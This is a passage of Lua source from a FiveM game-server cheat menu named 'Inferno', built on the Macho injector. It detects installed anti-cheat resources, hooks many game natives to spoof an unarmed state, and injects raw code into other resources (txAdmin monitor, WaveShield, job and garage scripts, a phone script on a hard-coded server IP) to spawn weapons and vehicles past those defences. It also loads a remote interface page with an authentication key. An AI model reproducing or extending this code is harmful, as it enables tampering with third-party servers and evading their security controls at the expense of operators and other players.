        { match = function(lower) return lower:find('pma-anticheat') end,                                            name = 'PMA AntiCheat' },
        { match = function(lower) return lower:find('drizzy') end,                                                   name = 'Drizzy AC' },
        { match = function(lower) return lower == 'greek_ac' end,                                                    name = 'Greek AC' },
        { match = function(lower) return lower == 'rac' end,                                                         name = 'RAC' },
        { match = function(lower) return lower == 'electronac' end,                                                  name = 'Electron AC' },
        { match = function(lower) return lower == 'pegasusac' end,                                                   name = 'Pegasus AC' }
    }

    for i = 0, numResources - 1 do
        local resourceName = GetResourceByFindIndex(i)

        if not resourceName then goto continue end

        local lower = string.lower(resourceName)

        for _, sig in ipairs(fileSignatures) do
            local ok = true
            for _, f in ipairs(sig.files) do
                if not LoadResourceFile(resourceName, f) then
                    ok = false
                    break
                end
            end
            if ok then
                detectedName, detectedAc = resourceName, sig.name
                break
            end
        end

        if detectedAc then break end

        for _, f in ipairs(reaperFiles) do
            if LoadResourceFile(resourceName, f) then
                local isPro = GetConvar('reaper_pro_addon_enabled', 'false') == 'true'
                detectedName = resourceName
                detectedAc = isPro and 'ReaperV4 Pro' or 'ReaperV4'
                break
            end
        end

        if detectedAc then break end

        local hasPamLua  = LoadResourceFile(resourceName, 'pam.obf.lua') or
            LoadResourceFile(resourceName, 'dist/pam.obf.lua')
        local hasPamJS   = LoadResourceFile(resourceName, 'pam.obf.js') or
            LoadResourceFile(resourceName, 'dist/pam.obf.js')
        local hasPamHTML = LoadResourceFile(resourceName, 'dist/pam.html')

        if (hasPamLua and hasPamJS) or (hasPamLua and hasPamHTML) then
            detectedName, detectedAc = resourceName, 'PhoenixAC'
            break
        end

        for _, pat in ipairs(namePatterns) do
            local ok, res = pcall(pat.match, lower)
            if ok and res then
                detectedName, detectedAc = resourceName, pat.name
                break
            end
        end

        if detectedAc then break end

        ::continue::
    end

    return detectedName, detectedAc
end
local function GetECACResourceName()
    local numResources = GetNumResources()
    for i = 0, numResources - 1 do
        local resourceName = GetResourceByFindIndex(i)
        if not resourceName then goto continue end
        local amt = GetNumResourceMetadata(resourceName, "shared_script")
        if amt > 0 then
            for idx = 0, amt - 1 do
                local scriptPath = GetResourceMetadata(resourceName, "shared_script", idx)
                if scriptPath and string.find(scriptPath, "EC_AC/shared.lua") then
                    return resourceName
                end
            end
        end

        ::continue::
    end
    return nil
end

-- Scan For AC
local name, ac = detectAntiCheat(false)
if ac then
    showNotify(('[^1Inferno^1] [^2Info^1] - ^2Detected Anti-Cheat: ^6%s ^2in Resource: ^6%s^7'):format(ac, name), "info")
else
    showNotify('[^1Inferno^1] [^2Info^1] - ^1No known Anti-Cheat detected.^7', "info")
end

_G.showNotify = showNotify

local function bindItemToKey(item, keyName)
    itemKeybinds[keyName] = nil
    for k, v in pairs(itemKeybinds) do
        if v == item then itemKeybinds[k] = nil end
    end
    itemKeybinds[keyName] = item
    showNotify("Bound [" .. (item.label or "item") .. "] to key: " .. keyName, "success")

    local binds = {}
    for k, v in pairs(itemKeybinds) do
        binds[#binds + 1] = { label = v.label or '?', key = k }
    end
    SendSvelte('updateKeybinds', { KeyBinds = binds })
end

local function startItemKeybindCapture(item)
    settingItemKeybind = true
    itemKeybindPending = item
    executeCode('any', string.format([[
        print("[Inferno Debug Keybinds] F4 Pressed on item label: %s")
    ]], tostring(item.label)))
    showInput("Press a key to bind: " .. (item.label or "item"), "", nil, "keybind")
end

local function handleKeybindSet()
    if not selectedKey or selectedKey == "ENTER" then return end

    if selectedKey and selectedKey ~= "ENTER" then
        MenuKey = selectedKey
        showNotify("Menu keybind set to: " .. MenuKey, "info")
    end

    currentInputData.inputJustSubmitted = true
    settingKeybind = false
    isKeybindConfigured = true
    selectedKey = nil
    closeInput()
end

local function setKeyPress(k)
    local keyName = KeyMap[k] and KeyMap[k]:upper() or nil

    if keyName == "ENTER" and currentInputData.inputJustSubmitted then
        return true
    end

    if not currentInputData.Active then return false end

    if k == 0x10 or k == 0xA0 or k == 0xA1 then
        modifiers.shift = true
    elseif k == 0x11 or k == 0xA2 or k == 0xA3 then
        modifiers.ctrl = true
    elseif k == 0x12 or k == 0xA4 or k == 0xA5 then
        modifiers.alt = true
    end

    if not keyName then return false end

    if settingKeybind then
        if keyName == "ENTER" then
            handleKeybindSet()
            return true
        elseif keyName == "ESCAPE" then
            closeInput()
            settingKeybind = false
            return true
        else
            selectedKey = keyName
            currentInputData.buffer = keyName
            currentInputData.cursorPos = #currentInputData.buffer
            pushBuffer()
            return true
        end
    end

    if settingItemKeybind then
        if keyName == "ESCAPE" then
            closeInput()
            settingItemKeybind = false
            itemKeybindPending = nil
            showNotify("Keybind cancelled", "info")
        elseif keyName ~= "ENTER" then
            local item = itemKeybindPending
            closeInput()
            settingItemKeybind = false
            itemKeybindPending = nil
            if item then bindItemToKey(item, keyName) end
        end
        return true
    end

    if keyName == "BACKSPACE" then
        if currentInputData.cursorPos > 0 then
            currentInputData.buffer = currentInputData.buffer:sub(1, currentInputData.cursorPos - 1) ..
                currentInputData.buffer:sub(currentInputData.cursorPos + 1)
            currentInputData.cursorPos = currentInputData.cursorPos - 1
            pushBuffer()
        end
        return true
    elseif keyName == "DELETE" then
        if currentInputData.cursorPos < #currentInputData.buffer then
            currentInputData.buffer = currentInputData.buffer:sub(1, currentInputData.cursorPos) ..
                currentInputData.buffer:sub(currentInputData.cursorPos + 2)
            pushBuffer()
        end
        return true
    elseif keyName == "ESCAPE" then
        closeInput()
        return true
    elseif keyName == "A" and modifiers.ctrl then
        currentInputData.selectAllActive = true
        currentInputData.cursorPos = #currentInputData.buffer
        pushBuffer()
        return true
    elseif keyName == "ENTER" then
        local submittedText = currentInputData.buffer

        local callback, buffer = closeInput()

        currentInputData.inputJustSubmitted = true

        if callback and type(callback) == "function" then
            callback(buffer)
        end

        Wait(300)
        currentInputData.inputJustSubmitted = false
        return true
    elseif keyName == "ARROWLEFT" or keyName == "LEFT" then
        if currentInputData.cursorPos > 0 then currentInputData.cursorPos = currentInputData.cursorPos - 1 end
        pushBuffer()
        return true
    elseif keyName == "ARROWRIGHT" or keyName == "RIGHT" then
        if currentInputData.cursorPos < #currentInputData.buffer then
            currentInputData.cursorPos = currentInputData
                .cursorPos + 1
        end
        pushBuffer()
        return true
    elseif keyName == "V" and modifiers.ctrl then
        local clipText = MachoGetClipboardText()
        if clipText and clipText ~= "" then
            currentInputData.buffer = currentInputData.buffer:sub(1, currentInputData.cursorPos) ..
                clipText .. currentInputData.buffer:sub(currentInputData.cursorPos + 1)
            currentInputData.cursorPos = currentInputData.cursorPos + #clipText
            pushBuffer()
        end
        return true
    end

    local char = keyName
    if modifiers.shift and ShiftMap[char] then
        char = ShiftMap[char]
    else
        char = char:lower()
    end

    if currentInputData.inputType == "numeric" and not char:match("^%d$") then return true end
    if currentInputData.inputType == "alphanumeric" and not char:match("^[%w_]$") then return true end
    if currentInputData.inputType == "letters" and not char:match("^%a$") then return true end

    if #char == 1 then
        currentInputData.buffer = currentInputData.buffer:sub(1, currentInputData.cursorPos) ..
            char .. currentInputData.buffer:sub(currentInputData.cursorPos + 1)
        currentInputData.cursorPos = currentInputData.cursorPos + 1
        pushBuffer()
    end

    return true
end

local function SetKeyRelease(k)
    if k == 0x10 or k == 0xA0 or k == 0xA1 then
        modifiers.shift = false
    elseif k == 0x11 or k == 0xA2 or k == 0xA3 then
        modifiers.ctrl = false
    elseif k == 0x12 or k == 0xA4 or k == 0xA5 then
        modifiers.alt = false
    end
end

if not currentInputData.SetListerner then
    MachoOnKeyDown(function(k)
        keyStates[k] = true
        setKeyPress(k)
    end)
    if MachoOnKeyUp then
        MachoOnKeyUp(function(k)
            keyStates[k] = false
            SetKeyRelease(k)
        end)
    end
    currentInputData.SetListener = true
end

CreateThread(function()
    while true do
        Wait(0)
        if currentInputData.Active then
            SetPlayerControl(PlayerId(), false, 0)
            MachoInjectResourceRaw('monitor',
                [[ playLibrarySound = function(sound) if sound == 'enter' or sound == 'confirm' then return end end SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]])
        else
            MachoInjectResourceRaw('monitor', [[ SetNuiFocus(false, false) sendMenuMessage('setDebugMode') ]])
            SetPlayerControl(PlayerId(), true, 0)
        end
    end
end)

local function loadInject()
    Wait(1200)

    settingKeybind = true
    selectedKey = MenuKey
    currentInputData.buffer = MenuKey
    currentInputData.cursorPos = #MenuKey
    currentInputData.inputJustSubmitted = false
    pushBuffer()
    showInput("Menu Keybind", MenuKey, function(key)
        if key and key ~= "" then
            MenuKey = key
            isKeybindConfigured = true
        end
    end, "SetKeybind")

    Wait(100)
    currentInputData.inputJustOpened = false
end
--------------------------------------------------------------------------------
-- Weapon And Misc Stuff
--------------------------------------------------------------------------------
local nativeGtaWeapons = {
    "WEAPON_UNARMED", "WEAPON_KNIFE", "WEAPON_DAGGER", "WEAPON_BAT", "WEAPON_BOTTLE", "WEAPON_CROWBAR", "WEAPON_GOLFCLUB",
    "WEAPON_HAMMER", "WEAPON_HATCHET", "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_NIGHTSTICK", "WEAPON_WRENCH",
    "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL", "WEAPON_STUNGUN", "WEAPON_PISTOL50",
    "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL", "WEAPON_FLAREGUN",
    "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_MACHINEPISTOL", "WEAPON_MINISMG",
    "WEAPON_COMBATPDW",
    "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2",
    "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_BULLPUPRIFLE", "WEAPON_GUSENBERG", "WEAPON_COMPACTRIFLE",
    "WEAPON_BULLPUPRIFLE_MK2", "WEAPON_MARKSMANRIFLE",
    "WEAPON_PUMPSHOTGUN", "WEAPON_PUMPSHOTGUN_MK2", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
    "WEAPON_BULLPUPSHOTGUN", "WEAPON_HEAVYSHOTGUN", "WEAPON_AUTOSHOTGUN",
    "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE_MK2",
    "WEAPON_GRENADE", "WEAPON_STICKYBOMB", "WEAPON_MOLOTOV", "WEAPON_PIPEBOMB", "WEAPON_PROXMINE", "WEAPON_RPG",
    "WEAPON_GRENADELAUNCHER", "WEAPON_MINIGUN", "WEAPON_FIREWORK",
    "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_RAILGUN", "WEAPON_HOMINGLAUNCHER", "WEAPON_COMPACTLAUNCHER",
    "WEAPON_BALL", "WEAPON_FLARE", "WEAPON_SMOKEGRENADE", "WEAPON_BZGAS", "WEAPON_PETROLCAN"
}

local function spawnWeaponByName(weaponName, ammoAmount)
    ammoAmount = ammoAmount or 255
    local ped = PlayerPedId()
    MachoHookNative(hash, function() -- HudWeaponWheelGetSelectedHash
        return false, GetHashKey("WEAPON_UNARMED")
    end)

    MachoHookNative(hash, function(ped, hash, p2) -- HasPedGotWeapon
        if hash == GetHashKey("WEAPON_UNARMED") then
            return false, true
        else
            return false, false
        end
    end)

    MachoHookNative(hash, function(ped, typeFlags) --IsPedArmed
        return false, false
    end)

    MachoHookNative(hash, function(ped, weaponHash) -- GetAmmoInClip
        return false, 0
    end)

    MachoHookNative(hash, function(ped, p1) -- GetWeaponObjectFromPed
        return false, 0
    end)

    MachoHookNative(hash, function(ped, p2) -- GetCurrentPedWeapon
        return false, false, -1569615261
    end)

    MachoHookNative(hash, function(ped) -- GetSelectedPedWeapon
        return false, GetHashKey("WEAPON_UNARMED")
    end)

    MachoHookNative(hash, function(ped, ignoreAmmoCount) -- GetBestPedWeapon
        return false, GetHashKey("WEAPON_UNARMED")
    end)

    -- // Ammo Checks (EXPLOSIVE WEAPONS ETC)
    MachoHookNative(0xC3287EE3050FB74C, function(weaponHash) -- GetWeapontypeGroup
        return false, -1609580060                            -- GROUP_UNARMED
    end)

    MachoHookNative(0x3BE0BB12D25FB305, function(weaponHash) -- GetWeaponDamageType
        return false, 2                                      -- melee
    end)

    MachoHookNative(0x015A522136D7F951, function(ped, weaponHash) -- GetAmmoInPedWeapon
        return false, 0
    end)
    -- Native Hooks to spoof weapon state (returns unarmed to bypass checks)
    -- GetCurrentPedWeapon
    MachoHookNative(0x3A87E44BB9A01D54, function(p, p2)
        if p == PlayerPedId() then return false, false, -1569615261 end
    end)

    -- GetSelectedPedWeapon
    MachoHookNative(0x0A6DB4965674D243, function(p)
        if p == PlayerPedId() then return false, -1569615261 end
        return true
    end)

    -- GetBestPedWeapon
    MachoHookNative(0x8483E98E8B888AE2, function(p, p1)
        if p == PlayerPedId() then return false, -1569615261 end
        return true
    end)

    -- IsPedArmed
    MachoHookNative(0x475768A975D5AD17, function(p, typeFlags)
        if p == PlayerPedId() then return false, false end
    end)

    -- HasPedGotWeapon
    MachoHookNative(0x8DECB02F88F428BC, function(p, weaponHash, p2)
        if p == PlayerPedId() then return false, false end
        return true
    end)

    -- GetAmmoInClip
    MachoHookNative(0x2E1202248937775C, function(p, weaponHash)
        if p == PlayerPedId() then return false, false, 0 end
        return true
    end)

    -- HudWeaponWheelGetSelectedHash
    MachoHookNative(0xA48931185F0536FE, function()
        return false, -1569615261
    end)

    -- GetLockonDistanceOfCurrentPedWeapon
    MachoHookNative(0x840F03E9041E2C9C, function(p)
        if p == PlayerPedId() then return false, 0.0 end
        return true
    end)

    -- GetPedConfigFlag (flag 331)
    MachoHookNative(0x7EE53118C892B513, function(p, flag, p2)
        if p == PlayerPedId() and flag == 331 then return false, false end
        return true
    end)

    -- RemoveWeaponFromPed - BLOCK IT
    MachoHookNative(0x4899CB088EDF59B8, function(p, weaponHash)
        if p == PlayerPedId() then return false end
        return true
    end)

    -- GetCurrentPedWeaponEntityIndex
    MachoHookNative(0x3B390A939AF0B5FC, function(p, p1)
        if p == PlayerPedId() then return false, 0 end
        return true
    end)

    -- GetPedWeaponTintIndex
    MachoHookNative(0x2B9EEDC07BD06B9F, function(p, weaponHash)
        if p == PlayerPedId() then return false, 0 end
        return true
    end)

    -- GetPedAmmoTypeFromWeapon
    MachoHookNative(0x7FEAD38B326B9F74, function(p, weaponHash)
        if p == PlayerPedId() then return false, 0 end
        return true
    end)

    -- GetPedAmmoByType
    MachoHookNative(0x39D22031557946C1, function(p, ammoType)
        if p == PlayerPedId() then return false, 0 end
        return true
    end)

    -- GetAmmoInPedWeapon
    MachoHookNative(0x015A522136D7F951, function(p, weaponHash)
        if p == PlayerPedId() then return false, 0 end
        return true
    end)

    -- GetMaxAmmoInClip
    MachoHookNative(0xA38DCFFCEA8962FA, function(p, weaponHash, p2)
        if p == PlayerPedId() then return false, 0 end
        return true
    end)

    -- GetMaxAmmo
    MachoHookNative(0xDC16122C7A20C933, function(p, weaponHash)
        if p == PlayerPedId() then return false, false, 0 end
        return true
    end)

    -- IsPedCurrentWeaponSilenced
    MachoHookNative(0x65F0C5AE05943EC7, function(p)
        if p == PlayerPedId() then return false, false end
        return true
    end)

    -- IsPedWeaponReadyToShoot
    MachoHookNative(0xB80CA294F2F26749, function(p)
        if p == PlayerPedId() then return false, false end
        return true
    end)

    -- IsPedShooting
    MachoHookNative(0x34616828CD07F1A1, function(p)
        if p == PlayerPedId() then return false, false end
        return true
    end)

    -- IsPedDoingDriveby
    MachoHookNative(0xB2C086CC1BF8F2BF, function(p)
        if p == PlayerPedId() then return false, false end
        return true
    end)

    -- IsPedReloading
    MachoHookNative(0x24B100C68C645951, function(p)
        if p == PlayerPedId() then return false, false end
        return true
    end)

    -- GetPedWeaponComponentTintIndex
    MachoHookNative(0xF0A60040BE558F2D, function(p, weaponHash, componentHash)
        if p == PlayerPedId() then return false, 0 end
        return true
    end)

    -- HasPedGotWeaponComponent
    MachoHookNative(0xC593212475FAE340, function(p, weaponHash, componentHash)
        if p == PlayerPedId() then return false, false end
        return true
    end)

    -- GetWeaponObjectFromPed
    MachoHookNative(0xCAE1DC9A0E22A16D, function(p, p1) return false, 0 end)

    -- GetWeaponClipSize
    MachoHookNative(0x583BE370B1EC6EB4, function(weaponHash) return false, 0 end)

    -- GetWeaponDamage
    MachoHookNative(0x3133B907D8B32053, function(weaponHash, componentHash) return false, 0.0 end)

    -- GetWeaponTimeBetweenShots
    MachoHookNative(0x065D2AACAD8CF7A4, function(weaponHash) return false, 0.0 end)

    -- GetWeaponDamageType
    MachoHookNative(0x3BE0BB12D25FB305, function(weaponHash) return false, 0 end)

    -- CanPedEquipWeapon
    MachoHookNative(0xB9A8252F8927A3B4, function(p, weaponHash)
        if p == PlayerPedId() then return false, true end
        return true
    end)

    -- GetPedDesiredMoveBlendRatio
    MachoHookNative(0x8C7D9D2A8D3DB1D2, function(p)
        if p == PlayerPedId() then return false, 0.0 end
        return true
    end)

    -- IsPedInMeleeCombat
    MachoHookNative(0x4E209B2C1EAD5159, function(p)
        if p == PlayerPedId() then return false, false end
        return true
    end)

    -- GetMaxRangeOfCurrentPedWeapon
    MachoHookNative(0x814C9D19DFD69679, function(p)
        if p == PlayerPedId() then return false, 1.0 end
        return true
    end)

    -- GetPedWeapontypeInSlot
    MachoHookNative(0xEFFED78E9011134D, function(p, weaponSlot)
        if p == PlayerPedId() then return false, -1569615261 end
        return true
    end)

    -- IsPedShootingInArea
    MachoHookNative(0x7E9DFE24AC1E58EF, function(p, x1, y1, z1, x2, y2, z2, p7, p8)
        if p == PlayerPedId() then return false, false end
        return true
    end)

    -- HudWeaponWheelGetSlotHash
    MachoHookNative(0xA13E93403F26C812, function(weaponTypeIndex)
        return false, -1569615261
    end)

    -- IsHudComponentActive
    MachoHookNative(0xBC4C9EA5391ECC0D, function(id)
        if id == 2 or id == 19 or id == 20 then return false, false end
        return true
    end)

    -- GetEntityPlayerIsFreeAimingAt
    MachoHookNative(0x2975C866E6713290, function(player)
        if player == PlayerId() then return false, false, 0 end
        return true
    end)

    -- GetPedParachuteState
    MachoHookNative(0x79CFD9827CC979B6, function(p) return false, 1 end)

    -- Bypass Wrapper
    local M9 = setmetatable({}, {
        __index = function(_, key)
            local fn = _G[key]
            if type(fn) == "function" then
                return function(...) return fn(...) end
            else
                return fn
            end
        end
    })

    -- Create thread for async asset loading
    M9.CreateThread(function()
        M9.Wait(35)

        local hash = M9.GetHashKey(weaponName)

        M9.RequestWeaponAsset(hash, 31, 0)
        while not M9.HasWeaponAssetLoaded(hash) do
            M9.Wait(1)
        end

        local myPed = M9.PlayerPedId()
        M9.GiveDelayedWeaponToPed(myPed, hash, ammoAmount, true)
        M9.SetPedAmmo(myPed, hash, ammoAmount)
    end)
end

local function setWeapon(weaponName)
    spawnWeaponByName(weaponName, 255)
    showNotify("Spawned Addon Weapon: " .. weaponName, "success")
end

local function spawnCustomVehicle(vehicleModel)
    if not vehicleModel or vehicleModel == "" then return end
    local handled = false

    if not handled and GetResourceState("likizao_ac") == "started" then
        handled = true
        MachoInjectResourceRaw('peds', string.format([[
            CreateThread(function()
                local coords = GetEntityCoords(PlayerPedId())
                local heading = GetEntityHeading(PlayerPedId())
                local model = GetHashKey('%s')
                local spawnX = coords.x + 5000.0
                local spawnY = coords.y + 5000.0
                local spawnZ = coords.z - 200.0

                RequestModel(model)
                while not HasModelLoaded(model) do
                    Wait(10)
                end

                local veh1 = CreateVehicle(model, spawnX, spawnY, spawnZ, heading, true, true)
                local veh2 = CreateVehicle(model, spawnX + 10.0, spawnY + 10.0, spawnZ, heading, true, true)

                SetEntityAsMissionEntity(veh1, true, true)
                NetworkRegisterEntityAsNetworked(veh1)
                SetVehicleOnGroundProperly(veh1)

                SetEntityAsMissionEntity(veh2, true, true)
                NetworkRegisterEntityAsNetworked(veh2)
                SetVehicleOnGroundProperly(veh2)

                Wait(200)

                local forward = GetEntityForwardVector(PlayerPedId())
                local pullPos1 = vector3(
                    coords.x + forward.x * 2.0,
                    coords.y + forward.y * 2.0,
                    coords.z
                )
                local pullPos2 = vector3(
                    coords.x + forward.x * 4.0,
                    coords.y + forward.y * 4.0,
                    coords.z
                )

                SetEntityCoords(veh1, pullPos1.x, pullPos1.y, pullPos1.z, false, false, false, true)
                SetEntityHeading(veh1, heading)
                SetVehicleOnGroundProperly(veh1)

                SetEntityCoords(veh2, pullPos2.x, pullPos2.y, pullPos2.z, false, false, false, true)
                SetEntityHeading(veh2, heading)
                SetVehicleOnGroundProperly(veh2)
            end)
        ]], vehicleModel))
    elseif not handled and GetResourceState("monitor") == "started" then
        handled = true
        MachoInjectResource2(3, 'monitor', string.format([[
            IS_REDM = true

            local _origSendSnackbarMessage = sendSnackbarMessage
            sendSnackbarMessage = function(level, message, isTranslationKey, tOptions)
                if message == 'nui_menu.page_main.vehicle.spawn.dialog_success' then
                    return
                end
                return _origSendSnackbarMessage(level, message, isTranslationKey, tOptions)
            end

            XFakeWarp = function(...) return XWT(1) end
            _ENV["TaskWarpPedIntoVehicle"] = XFakeWarp

            local stateName = 'Storm:' .. math.random(1000)
            LocalPlayer.state:set(stateName, TriggerEvent, false)
            LocalPlayer.state[stateName]('txcl:vehicle:spawn:redm', '%s')
        ]], vehicleModel))
    elseif not handled and GetResourceState("WaveShield") == "started" then
        handled = true
        MachoInjectResource2(3, 'any', string.format([[
            local function spawnVehicle(model, ...)
                local vehState = 'CreateVehicle:'..model..':'..math.random(999999, 999999999)..GetCurrentResourceName()..GetGameTimer()

                LocalPlayer.state:set(vehState, CreateVehicle, false)
                LocalPlayer.state[vehState](model, ...)
            end

            XFakeWarp = function(...) return XWT(1) end
            _ENV["TaskWarpPedIntoVehicle"] = XFakeWarp

            spawnVehicle('%s', GetEntityCoords(PlayerPedId()), 0.0, true, false)
        ]], vehicleModel))
    elseif not handled and GetResourceState("17mov_BuilderJob") == "started" then
        handled = true
        MachoInjectResource2(3, '17mov_BuilderJob', string.format([[
            local playerPed = PlayerPedId()
            local coords = GetEntityCoords(playerPed)
            local heading = GetEntityHeading(playerPed)
            local spawnCoords = vector4(coords.x, coords.y, coords.z, heading)

            SpawnVehicle('%s', spawnCoords, true)
        ]], vehicleModel))
    elseif not handled and GetResourceState("17mov_WindowCleaning") == "started" then
        handled = true
        MachoInjectResource2(3, '17mov_WindowCleaning', string.format([[
            local playerPed = PlayerPedId()
            local coords = GetEntityCoords(playerPed)
            local heading = GetEntityHeading(playerPed)
            local spawnCoords = vector4(coords.x, coords.y, coords.z, heading)

            SpawnVehicle('%s', spawnCoords, true)
        ]], vehicleModel))
    elseif not handled and GetResourceState("17mov_GarbageCollector") == "started" then
        handled = true
        MachoInjectResource2(3, '17mov_GarbageCollector', string.format([[
            local playerPed = PlayerPedId()
            local coords = GetEntityCoords(playerPed)
            local heading = GetEntityHeading(playerPed)
            local spawnCoords = vector4(coords.x, coords.y, coords.z, heading)

            SpawnVehicle('%s', spawnCoords, true)
        ]], vehicleModel))
    elseif not handled and GetResourceState("17mov_Deliverer") == "started" then
        handled = true
        MachoInjectResource2(3, '17mov_Deliverer', string.format([[
            local playerPed = PlayerPedId()
            local coords = GetEntityCoords(playerPed)
            local heading = GetEntityHeading(playerPed)
            local spawnCoords = vector4(coords.x, coords.y, coords.z, heading)

            SpawnVehicle('%s', spawnCoords, true)
        ]], vehicleModel))
    elseif not handled and GetResourceState("17mov_Electrician") == "started" then
        handled = true
        MachoInjectResource2(3, '17mov_Electrician', string.format([[
            local playerPed = PlayerPedId()
            local coords = GetEntityCoords(playerPed)
            local heading = GetEntityHeading(playerPed)
            local spawnCoords = vector4(coords.x, coords.y, coords.z, heading)

            SpawnVehicle('%s', spawnCoords, true)
        ]], vehicleModel))
    elseif not handled and GetResourceState("17mov_Postman") == "started" then
        handled = true
        MachoInjectResource2(3, '17mov_Postman', string.format([[
            local playerPed = PlayerPedId()
            local coords = GetEntityCoords(playerPed)
            local heading = GetEntityHeading(playerPed)
            local spawnCoords = vector4(coords.x, coords.y, coords.z, heading)

            SpawnVehicle('%s', spawnCoords, true)
        ]], vehicleModel))
    elseif GetCurrentServerEndpoint() == "45.45.239.34:30120" then
        handled = true
        MachoInjectResourceRaw('lb-phone', string.format([[
            local vehicleData = {
                vehicle = json.encode({
                    model = %q,
                })
            }
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)

            CreateFrameworkVehicle(vehicleData, coords)
        ]], vehicleModel))
    elseif not handled and GetResourceState("jg-advancedgarages") == "started" then
        handled = true
        MachoInjectResourceRaw("jg-advancedgarages", string.format([[
            local coords = GetEntityCoords(PlayerPedId())
            spawnVehicleClient(1, %q, 'Inferno.lua', coords, false, {}, false)
        ]], vehicleModel))
    end
end
--------------------------------------------------------------------------------
local function InitializeInterface()
    local authKey = MachoAuthenticationKey()
    Dui = MachoCreateDui("https://risklua.com/okiriskykd3i2das/?authid=" .. authKey)
    if Dui then
        MachoShowDui(Dui)
        setCurrent()
        loadInject()
    end
end

CreateThread(function()
    InitializeInterface()

    if Dui then MachoSendDuiMessage(Dui, json.encode({ action = 'getAuthName', authName = authenticatedUser })) end

    while true do
        if IsVisible and Dui then
            setCurrent()
            Wait(400)
        else
            Wait(100)
        end
    end
end)

local function getControl(keyCode)
    return KeyMap[tonumber(keyCode) or keyCode] or ("unknown key (" .. tostring(keyCode) .. ")")
end

local function getTabKey()
    if not currentTabs then return nil end
    local tab = currentTabs[currentTabIndex + 1]
    if not tab then return nil end
    local parent = nestedMenus[#nestedMenus]
    return (parent and parent.label or "root") .. "_" .. tab.name
end

local function findFirstValid(menu, startIdx, dir)
    local n = #menu
    local idx = startIdx
    for _ = 1, n do
        local item = menu[idx]
        if item and item.type ~= "divider" and not item.hidden and item.visible ~= false then
            return idx
        end
        idx = idx + dir
        if idx < 1 then idx = n end
        if idx > n then idx = 1 end
    end
    return startIdx
end

local function createActiveIndex(direction)
    if not activeMenu or #activeMenu == 0 then return end
    local n = #activeMenu
    local dir = direction > 0 and 1 or -1
    local next = activeIndex + dir
    if next < 1 then next = n elseif next > n then next = 1 end
    activeIndex = findFirstValid(activeMenu, next, dir)
    local tabKey = getTabKey()
    if tabKey then lastTabIndices[tabKey] = activeIndex end
    setCurrent()
end

local function createIndex()
    if not activeMenu or #activeMenu == 0 then return end
    if activeMenu[activeIndex] and activeMenu[activeIndex].type == "divider" then
        activeIndex = findFirstValid(activeMenu, activeIndex + 1, 1)
    end
end

local function createConfirm(item, payload)
    if item and item.autoConfirm and type(item.onConfirm) == "function" then
        item.onConfirm(payload)
    end
end

local function createSlider(item, dir)
    local step = item.step or item.stepSize or 1
    local min = tonumber(item.min) or 0
    local max = tonumber(item.max) or 100
    item.value = math.max(min, math.min(max, (tonumber(item.value) or 0) + dir * step))
    createConfirm(item, item.value)
end

local function createScroll(item, dir)
    local opts = item.options
    if not opts or #opts == 0 then return end
    local sel = (tonumber(item.selected) or 1) + dir
    item.selected = sel < 1 and #opts or sel > #opts and 1 or sel
    createConfirm(item, opts[item.selected])
end

local function createValue(item, dir)
    if not item or not item.type then return end
    local t = item.type
    if t == "slider" or (type(t) == "table" and table.concat(t, ","):find("slider")) then
        createSlider(item, dir)
    elseif t == "scroll" or (type(t) == "table" and table.concat(t, ","):find("scroll")) then
        createScroll(item, dir)
    end
end

local function createOptions(control, item)
    if not item then return end
    createValue(item, control == "ArrowRight" and 1 or -1)
    setCurrent()
end

local function fireConfirm(item, t)
    if type(item.onConfirm) ~= "function" then return end
    if t == "checkbox" then
        item.onConfirm(item.checked)
    elseif t == "slider" then
        item.onConfirm(item.value)
    elseif t == "scroll" then
        item.onConfirm(item.options and item.options[item.selected or 1] or nil)
    elseif t == "button" then
        item.onConfirm()
    end
end

local function sendTabs(tabs)
    if not Dui or not tabs then return end
    local names = {}
    for i = 1, #tabs do names[i] = tabs[i].name end
    MachoSendDuiMessage(Dui, json.encode({ action = "setTabs", tabs = names }))
    MachoSendDuiMessage(Dui, json.encode({ action = "setTabIndex", index = currentTabIndex }))
end

local function loadTab(tabIndex, fromSaved)
    local tab = currentTabs and currentTabs[tabIndex + 1]
    if not tab then return end
    currentTabIndex = tabIndex
    activeMenu = tab.submenu or {}
    local key = getTabKey()
    activeIndex = math.min((key and lastTabIndices[key]) or (fromSaved or 1), math.max(#activeMenu, 1))
    createIndex()
    setCurrent()
end

local function createEnter(item)
    if not item then return end
    local t = item.type

    if t == "submenu" then
        if #nestedMenus == 0 then lastMainMenuIndex = activeIndex end
        nestedMenus[#nestedMenus + 1] = { index = activeIndex, menu = activeMenu, label = item.label }

        if item.submenu then
            menuStateMap[item.label or ""] = activeIndex
            activeMenu = item.submenu
            activeIndex = 1
            currentTabs = nil
            currentSubMenuRefresher = nil
            isDynamicSubMenu = false
            createIndex()
            setCurrent()
            return
        end

        local tabs = item.tabs
        if tabs and #tabs > 0 then
            currentTabs = tabs
            local saved = tabStateMap[item.label]
            local tabIdx = saved and math.min(saved.tab or 0, #tabs - 1) or 0
            loadTab(tabIdx, saved and saved.index or 1)
            sendTabs(tabs)
        end
        return
    end

    if type(t) == "table" then
        for i = 1, #t do
            if t[i] == "checkbox" then
                item.checked = not item.checked
                if IsVisible then setCurrent() end
                break
            end
        end
        for i = 1, #t do fireConfirm(item, t[i]) end
        return
    end

    if t == "checkbox" then
        item.checked = not item.checked
        if IsVisible then setCurrent() end
    end

    fireConfirm(item, t)
end

local function createBackspace()
    local depth = #nestedMenus
    if depth == 0 then
        HideUI()
        currentSubMenuRefresher = nil
        isDynamicSubMenu = false
        return
    end

